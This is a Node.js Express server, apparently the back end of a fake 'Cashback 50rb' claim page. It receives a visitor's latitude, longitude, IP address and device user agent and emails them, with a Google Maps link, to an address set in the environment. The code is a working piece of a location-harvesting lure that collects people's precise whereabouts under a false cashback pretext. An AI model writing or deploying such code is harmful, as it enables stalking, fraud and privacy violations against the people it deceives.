import express from 'express';
import nodemailer from 'nodemailer';

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

app.post('/kirim', async (req, res) => {
  const { lat, lon, ip, userAgent, waktu } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_PENGIRIM,
      pass: process.env.EMAIL_PASSWORD
    }
  });

  const mailOptions = {
    from: process.env.EMAIL_PENGIRIM,
    to: process.env.EMAIL_TUJUAN,
    subject: 'Data Lokasi Cashback',
    text: `
Event Cashback 50rb - Lokasi Klaim
Waktu: ${waktu}
Lokasi: https://www.google.com/maps?q=${lat},${lon}
(Lat: ${lat}, Lon: ${lon})
IP: ${ip}
Perangkat: ${userAgent}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    res.send('Email berhasil dikirim.');
  } catch (err) {
    console.error(err);
    res.status(500).send('Gagal mengirim email.');
  }
});

app.listen(PORT, () => console.log(`Server berjalan di port ${PORT}`));
